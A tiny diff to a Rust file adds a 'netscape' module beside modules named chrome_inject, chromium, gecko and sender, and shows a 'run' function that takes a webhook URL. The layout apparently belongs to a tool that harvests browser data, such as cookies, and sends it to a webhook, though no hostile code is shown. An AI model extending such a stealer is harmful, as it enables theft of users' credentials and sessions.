@@ -1,6 +1,7 @@
 pub mod chrome_inject;
 pub mod chromium;
 pub mod gecko;
+mod netscape;
 pub mod sender;
 
 pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
